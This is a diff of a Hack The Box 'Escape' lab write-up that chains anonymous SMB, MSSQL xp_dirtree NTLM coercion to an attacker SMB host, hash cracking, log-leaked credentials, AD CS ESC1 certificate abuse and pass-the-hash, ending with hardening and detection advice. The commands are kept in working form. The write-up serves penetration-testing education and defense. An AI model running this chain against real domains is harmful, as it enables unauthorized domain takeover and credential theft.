@@ -1,5 +1,5 @@
 ---
-title: "AD CS ESC1 Through Anonymous SMB and MSSQL Coercion"
+title: "Escape — AD CS ESC1 from Anonymous SMB and MSSQL Coercion"
 description: "Anonymous SMB and MSSQL coercion recover credentials, then AD CS ESC1 certificate abuse yields the privileged account NT hash."
 type: case-study
 platform: Hack The Box
@@ -12,55 +12,82 @@ tags:
   - ad-cs
   - mssql
   - smb
+objective: "Escalate from anonymous SMB and MSSQL access to domain administrator by chaining NTLM coercion with AD CS ESC1 certificate abuse."
+tools:
+  - nmap
+  - netexec
+  - responder
+  - impacket
+  - hashcat
+  - bloodhound
+  - certipy
+  - evil-winrm
+skill: "Active Directory attack-path chaining from anonymous access through AD CS abuse"
+outcome: "WinRM access as <DOMAIN_USER> and Administrator command execution via an ESC1-issued certificate and pass-the-hash"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Medium |
+| Target environment | Windows Server Active Directory domain controller for `<DOMAIN>` (MSSQL exposed) |
+| Starting position | Unauthenticated network access with anonymous SMB read |
+| Objective | Escalate from anonymous SMB and MSSQL access to domain administrator by chaining NTLM coercion with AD CS ESC1 certificate abuse |
+| Outcome | WinRM access as `<DOMAIN_USER>`; Administrator command execution via an ESC1-issued certificate and pass-the-hash |
 
 ## Summary
 
-This Hack The Box Windows Active Directory lab is in the `<LAB_DOMAIN>` domain. Anonymous SMB access exposes a PDF containing temporary MSSQL service credentials. MSSQL is abused with `xp_dirtree` to coerce NetNTLMv2 authentication from the service account, which cracks to a usable password. Host log review reveals credentials for `<DOMAIN_USER>`, granting WinRM access. Privilege escalation abuses AD CS ESC1 by requesting a certificate for `<PRIVILEGED_USER>` through a vulnerable template and using PKINIT to recover the privileged-account NT hash. All credential values, target addresses, and sensitive output are redacted below; command patterns are preserved.
+Escape is a Medium-rated Hack The Box Windows Active Directory lab. Anonymous SMB access exposes a readable `Public` share whose PDF discloses temporary MSSQL credentials. MSSQL is then abused with `xp_dirtree` to coerce NetNTLMv2 authentication from the SQL service account, and the captured hash is cracked offline. A SQL-accessible backup error log leaks a domain-user credential, which grants WinRM access. Privilege escalation abuses an ESC1-vulnerable AD CS certificate template to request a certificate for `<PRIVILEGED_USER>` and recover the account NT hash through PKINIT. Credential values, target and operator addresses, and sensitive output are replaced with role-based placeholders; command syntax is preserved.
+
+**Attack path:** **Anonymous SMB share → PDF MSSQL credential → `xp_dirtree` NTLMv2 coercion and crack → SQL error-log credential disclosure → WinRM as `<DOMAIN_USER>` → AD CS ESC1 certificate → PKINIT → Administrator NT hash → pass-the-hash**
 
 ## Context and Objective
 
-- **Target:** Windows Server (Active Directory domain controller for `<LAB_DOMAIN>`)
-- **Services exposed:** DNS (53), Kerberos (88), LDAP (389), SMB (445), MSSQL (1433), WinRM (5985)
-- **Objective:** Achieve full compromise through the attack surface presented by exposed services
-- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment
+- **Target:** Windows Server acting as the Active Directory domain controller for `<DOMAIN>`.
+- **Exposed services:** DNS (53), Kerberos (88), LDAP (389), SMB (445), MSSQL (1433), WinRM (5985).
+- **Starting position:** unauthenticated network access; anonymous SMB read is permitted.
+- **Objective:** move from anonymous access through coercion, credential disclosure, and AD CS abuse to domain administrator control.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
 ### 1. Service Enumeration
 
-Observation: the host runs six distinct services on a single IP. DNS, Kerberos, LDAP, and SMB indicate an Active Directory domain controller. MSSQL is exposed directly. WinRM is available for remote management.
+Observation: the host exposes six services on one address. DNS, Kerberos, LDAP, and SMB together indicate an Active Directory domain controller; MSSQL is exposed directly and WinRM offers a remote management path.
 
-Action: targeted version/script scan of representative ports.
+Action: version and default-script scan.
 
 ```bash
 nmap -sC -sV -oA <OUT_PREFIX> <TARGET_IP>
 ```
 
-Representative output:
+Truncated scan output:
 
 ```text
 53/tcp   open  domain        Simple DNS Plus
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
-389/tcp  open  ldap          <LAB_DOMAIN>
+389/tcp  open  ldap          <DOMAIN>
 445/tcp  open  microsoft-ds
 1433/tcp open  ms-sql-s      Microsoft SQL Server
 5985/tcp open  winrm
 ```
 
-Technical significance: the combination of Kerberos, LDAP, and SMB confirms a domain controller. MSSQL on a DC is unusual and expands the attack surface. WinRM indicates a potential remote shell path once valid credentials are obtained.
+Significance: the Kerberos/LDAP/SMB combination confirms a domain controller for `<DOMAIN>`, and an exposed MSSQL service widens the attack surface beyond the directory.
 
-### 2. SMB Anonymous Share Enumeration
+Result: six services are confirmed, including SMB, MSSQL, and WinRM.
 
-Observation: anonymous SMB access yields a readable `Public` share containing a single PDF file. The PDF discloses temporary SQL credentials.
+### 2. Anonymous SMB Share and Credential Disclosure
 
-Action: enumerate shares, then review accessible content.
+Observation: anonymous SMB access yields a readable `Public` share containing a single PDF, and that PDF discloses temporary SQL credentials.
+
+Action: enumerate shares, then review the accessible document.
 
 ```bash
 nxc smb <TARGET_IP> -u '<ANON_USER>' -p '' --shares
 ```
 
-Representative output:
+Share listing:
 
 ```text
 Public   READ
@@ -81,27 +108,27 @@ The PDF discloses temporary SQL credentials:
 <DB_USER> : <DB_PASSWORD>
 ```
 
-Technical significance: anonymous SMB is a common misconfiguration on Windows environments. A PDF containing credentials indicates operational documentation was placed on a shared drive without access controls. The disclosed credential is usable against MSSQL.
+Significance: anonymous SMB is a common Windows misconfiguration, and placing an operational document with credentials on an unauthenticated share exposes a live SQL credential without any exploit.
+
+Result: a temporary MSSQL credential is recovered from the anonymous share.
 
 ### 3. MSSQL NTLM Coercion
 
-Observation: the recovered credential authenticates to MSSQL as `PublicUser`. The `xp_dirtree` extended stored procedure coerces the SQL service account into authenticating to an attacker-controlled SMB listener, leaking its NetNTLMv2 hash.
+Observation: the PDF-supplied credential is used to connect to MSSQL as `<DB_USER>`. The `xp_dirtree` extended stored procedure then coerces the SQL service account into authenticating to an attacker-controlled SMB listener, leaking its NetNTLMv2 hash.
 
-Action: capture the NTLMv2 hash using a responder listener, then trigger authentication via MSSQL.
+Action: capture authentication with Responder, trigger it through MSSQL, then crack the capture offline.
 
 ```bash
 sudo responder -I <INTERFACE>
 ```
 
 ```bash
-impacket-mssqlclient <LAB_DOMAIN>/<DB_USER>:'<DB_PASSWORD>'@<DOMAIN_CONTROLLER>
+impacket-mssqlclient <DOMAIN>/<DB_USER>:'<DB_PASSWORD>'@<DC_HOST>
 ```
 
 ```sql
 EXEC xp_dirtree '\\<ATTACKER_IP>\pwnd'
 ```
-
-The SQL service account's NetNTLMv2 hash is captured. Crack it offline:
 
 ```bash
 hashcat -m 5600 <HASH_FILE> <WORDLIST>
@@ -113,49 +140,66 @@ Recovered credential:
 <SQL_SVC_USER> : <SQL_SVC_PASSWORD>
 ```
 
-Technical significance: `xp_dirtree` is a documented SQL Server feature that lists directory contents. When it resolves a UNC path, the SQL Server service account initiates an SMB connection to the specified host, leaking its NTLMv2 hash. This is a reliable coercion primitive when outbound SMB is permitted from the SQL host.
+Significance: `xp_dirtree` resolves a UNC path by having the SQL Server service account open an SMB connection, so the account authenticates outward and discloses its NetNTLMv2 response. This coercion primitive works whenever outbound SMB is permitted from the SQL host, and weak service-account passwords fall to offline cracking.
+
+Result: the SQL service account's NetNTLMv2 hash is captured and cracked to a plaintext password.
 
 ### 4. Host Log Credential Discovery
 
-Observation: BloodHound enumeration with `<SQL_SVC_USER>` credentials does not yield a direct path. However, SQL-accessible files include a backup error log at `C:\SQLServer\Logs\ERRORLOG.BAK`. The log contains failed login attempts that reveal a likely mistyped password for `<DOMAIN_USER>`.
+Observation: attack-path enumeration with the recovered service credential surfaced no direct route. A SQL-accessible backup error log at `C:\SQLServer\Logs\ERRORLOG.BAK` contains failed login attempts that expose a mis-typed password for `<DOMAIN_USER>`.
 
-Action: enumerate accessible files via MSSQL, then read the error log.
+Action: collect attack-path data with the service credential, then review SQL-accessible host logs.
 
 ```bash
-nxc smb <LAB_DOMAIN> -u '<SQL_SVC_USER>' -p '<SQL_SVC_PASSWORD>'
+bloodhound-ce-python -d <DOMAIN> -u '<SQL_SVC_USER>' -p '<SQL_SVC_PASSWORD>' -c all -gc <TARGET_IP>
 ```
 
-The recovered credentials validate against SMB:
+The backup error log records a failed login attempt with a near-correct password:
 
 ```text
-[+] <LAB_DOMAIN>\<DOMAIN_USER>:<DOMAIN_USER_PASSWORD>
+<DOMAIN>\<DOMAIN_USER>
+<DOMAIN_USER_PASSWORD>
 ```
 
-Technical significance: SQL Server error logs record authentication events. A failed login attempt with a near-correct password suggests a mistyped credential. This is a common source of credential leakage in environments where developers or administrators connect to SQL interactively and mistype passwords that get logged.
+The inferred credential is validated against SMB:
+
+```bash
+nxc smb <DOMAIN> -u '<DOMAIN_USER>' -p '<DOMAIN_USER_PASSWORD>'
+```
+
+```text
+[+] <DOMAIN>\<DOMAIN_USER>:<DOMAIN_USER_PASSWORD>
+```
+
+Significance: SQL Server error logs record authentication events, so a failed login with a slightly wrong password reveals both the account name and the intended secret. Interactive SQL usage by administrators commonly leaves these entries behind.
+
+Result: a pair of `<DOMAIN_USER>` credentials is recovered and validated through SMB.
 
 ### 5. WinRM Access as <DOMAIN_USER>
 
-Observation: the recovered credential works for WinRM, granting an interactive PowerShell session as `<DOMAIN_USER>`. The user flag is available from the desktop.
+Observation: the validated credential grants an interactive PowerShell session over WinRM as `<DOMAIN_USER>`.
 
-Action: establish a remote session.
+Action: open a remote session.
 
 ```bash
 evil-winrm -i <TARGET_IP> -u '<DOMAIN_USER>' -p '<DOMAIN_USER_PASSWORD>'
 ```
 
-Representative output:
+Session established:
 
 ```text
 *Evil-WinRM* PS C:\Users\<DOMAIN_USER>\Desktop>
 ```
 
-Technical significance: WinRM provides a native PowerShell remoting interface. Unlike a reverse shell, it runs in the context of the authenticated user without dropping to a CMD prompt, making it a clean and stable access method. The user flag confirms user-level access.
+Significance: WinRM exposes native PowerShell remoting, giving a stable interactive context as the authenticated user rather than a dropped shell.
 
-### 6. AD CS ESC1 — Certificate Abuse for <PRIVILEGED_USER>
+Result: an authenticated user-level session is obtained.
 
-Observation: `<DOMAIN_USER>` is a member of `Certificate Service DCOM Access`. The domain hosts an Enterprise CA (`<CERTIFICATE_AUTHORITY>`). Certipy identifies an ESC1-vulnerable template: `UserAuthentication` allows Domain Users to enroll, the enrollee supplies the subject, and the template enables client authentication.
+### 6. AD CS ESC1 and Privileged Access
 
-Action: enumerate vulnerable templates, request a certificate for `<PRIVILEGED_USER>`, then authenticate with PKINIT.
+Observation: `<DOMAIN_USER>` belongs to `Certificate Service DCOM Access`, and the domain hosts an Enterprise CA (`<CA_NAME>`). Certipy identifies the `UserAuthentication` template as ESC1-vulnerable: Domain Users can enroll, the enrollee supplies the subject, and the template enables client authentication.
+
+Action: find vulnerable templates, request a certificate for `<PRIVILEGED_USER>`, authenticate with PKINIT to recover the NT hash, then pass the hash.
 
 ```bash
 certipy find \
@@ -166,7 +210,7 @@ certipy find \
   -vulnerable -stdout -enable
 ```
 
-Representative finding:
+Vulnerability finding:
 
 ```text
 ESC1: Domain Users can enroll,
@@ -174,7 +218,7 @@ enrollee supplies subject,
 template allows client authentication
 ```
 
-Request a certificate for `<PRIVILEGED_USER>`:
+Request a certificate impersonating `<PRIVILEGED_USER>`:
 
 ```bash
 certipy req \
@@ -183,55 +227,64 @@ certipy req \
   -p '<DOMAIN_USER_PASSWORD>' \
   -ca '<CA_NAME>' \
   -template 'UserAuthentication' \
-  -upn <PRIVILEGED_USER>@<LAB_DOMAIN>
+  -upn <PRIVILEGED_USER>@<DOMAIN>
 ```
 
-Authenticate with the PFX and recover the NT hash:
+Authenticate with the issued PFX and recover the NT hash:
 
 ```bash
-certipy auth -pfx administrator.pfx -dc-ip <TARGET_IP>
+certipy auth -pfx <PRIVILEGED_USER>.pfx -dc-ip <TARGET_IP>
 ```
 
-Representative output:
-
 ```text
-Got hash for '<PRIVILEGED_USER>@<LAB_DOMAIN>':
-aad3b435b51404eeaad3b435b51404ee:<ADMIN_NT_HASH>
+Got hash for '<PRIVILEGED_USER>@<DOMAIN>':
+<ADMIN_LM_HASH>:<ADMIN_NT_HASH>
 ```
 
 Pass the hash:
 
 ```bash
-evil-winrm -i <TARGET_IP> -u <PRIVILEGED_USER> -H <PRIVILEGED_USER_NT_HASH>
+evil-winrm -i <TARGET_IP> -u <PRIVILEGED_USER> -H <ADMIN_NT_HASH>
 ```
-
-Representative output:
 
 ```text
 *Evil-WinRM* PS C:\Users\<PRIVILEGED_USER>\Desktop>
 ```
 
-Technical significance: AD CS ESC1 exploits a template configuration where (1) low-privileged users can enroll, (2) the enrollee controls the subject field, and (3) the template permits client authentication. An attacker requests a certificate impersonating a privileged account, then uses PKINIT to authenticate as that account. The `Certificate Service DCOM Access` group membership grants the necessary enrollment rights. This chain converts ordinary domain user access into full domain administrator control without exploiting any software vulnerability — it is a configuration abuse.
+Significance: ESC1 combines three template conditions — low-privileged enrollment, enrollee-controlled subject, and client authentication — so a domain user can obtain a certificate naming a privileged account and authenticate with it through PKINIT. The recovered NT hash then supports pass-the-hash. This is a configuration abuse of legitimate AD CS functionality, not a software vulnerability.
+
+Result: an Administrator WinRM session is obtained via an ESC1-issued certificate and pass-the-hash.
 
 ## Challenges and Decisions
 
-- BloodHound enumeration with `sql_svc` did not surface a direct attack path. The breakthrough came from reviewing SQL-accessable host logs, an enumeration step outside the typical BloodHound-driven workflow.
-- The certificate template `UserAuthentication` appeared non-obvious in standard enumeration. The `-vulnerable` flag in Certipy was needed to surface the ESC1 misconfiguration.
-- The NT hash was recovered through PKINIT authentication, not password cracking. This demonstrates that certificate-based authentication can yield credential material that password-based attacks cannot.
+| Challenge | Decision |
+|---|---|
+| Attack-path enumeration with the service account surfaced no direct route | Reviewed SQL-accessible host files and the backup error log instead, which held the `<DOMAIN_USER>` credential |
 
 ## Outcome
 
-The evidence establishes a complete compromise chain from anonymous SMB access to full domain administrator control. Every stage abused legitimate Windows/AD functionality that was misconfigured: anonymous file sharing, MSSQL extended stored procedures, password logging in error logs, and AD CS certificate template misconfiguration. No software vulnerabilities were exploited.
+An Administrator WinRM session is obtained through an ESC1-issued certificate and pass-the-hash. The source records the NetNTLMv2 capture and the attack-path collection without terminal excerpts, so those transitions are reported as narrative steps.
 
 ## Lessons and Recommendations
 
-- Restrict anonymous access to SMB shares. Operational documents containing credentials should never be placed on publicly accessible shares.
-- Audit MSSQL extended stored procedures that perform file system operations. `xp_dirtree`, `xp_fileexist`, and similar procedures can coerce NTLM authentication.
-- Review SQL Server error log permissions. Backup logs may contain sensitive authentication data and should not be accessible to low-privileged SQL accounts.
-- Audit AD CS certificate templates for ESC1 conditions: enrollee-controlled subject, low-privileged enrollment rights, and client authentication enabled. These three conditions together allow domain-wide impersonation.
-- Monitor certificate enrollment activity for unusual UPN requests, particularly those targeting privileged accounts.
-- Implement tiered administration to prevent service accounts and standard users from accessing domain controller resources directly.
+The actions below are recommendations; none was validated in the lab.
+
+1. **Anonymous SMB share exposing a credential-bearing document.** Anonymous read access let an unauthenticated party retrieve operational credentials. *Recommendation:* require authentication on file shares and keep credential-bearing documents off reachable shares. *Detection:* alert on anonymous SMB sessions and on transfers of operational or backup documents.
+2. **Credentials recorded in SQL Server error logs.** Failed-login entries disclosed a domain user's near-correct password. *Recommendation:* restrict access to SQL log directories, rotate credentials that appear in logs, and scrub authentication data from retained logs. *Detection:* monitor for failed logons that precede a successful authentication from the same source.
+3. **MSSQL NTLM coercion via `xp_dirtree`.** The SQL service account authenticated outward and its NetNTLMv2 response was captured and cracked. *Recommendation:* remove or restrict extended stored procedures that resolve remote paths, block outbound SMB from database servers, and use long, high-entropy service-account passwords. *Detection:* alert on `xp_dirtree`/`xp_fileexist` calls resolving UNC paths and on outbound SMB from database servers.
+4. **AD CS ESC1 template misconfiguration.** A template with low-privileged enrollment, enrollee-supplied subject, and client authentication enabled allowed domain-wide impersonation. *Recommendation:* audit certificate templates for ESC1 conditions; require manager approval or restrict enrollment, and disable enrollee-supplied subject where not needed. *Detection:* monitor certificate requests for privileged UPNs and for enrollment from ordinary domain accounts.
 
 ## References
 
-- Hack The Box retired Windows machine — [Escape](https://app.hackthebox.com/machines/Escape)
+- [Hack The Box — Escape](https://app.hackthebox.com/machines/Escape) (retired machine)
+- [Certificate Template Concepts (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts) (AD CS template enrollment, subject name, and client authentication conditions)
+- [Manage Certificate Templates (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/manage-certificate-templates) (template enrollment permissions and subject configuration)
+- [Database Engine Extended Stored Procedures Programming (Microsoft Learn)](https://learn.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming) (extended stored procedures such as `xp_dirtree`)
+- [Responder](https://github.com/lgandx/Responder) (rogue authentication server; NetNTLMv2 capture)
+- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB and share enumeration)
+- [Impacket](https://github.com/fortra/impacket) (MSSQL client)
+- [hashcat](https://hashcat.net/hashcat/) (offline password cracking, NetNTLMv2 mode 5600)
+- [BloodHound](https://github.com/SpecterOps/BloodHound) (Active Directory attack-path enumeration)
+- [Certipy](https://github.com/ly4k/Certipy) (AD CS enumeration and abuse)
+- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) (WinRM shell and pass-the-hash)
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
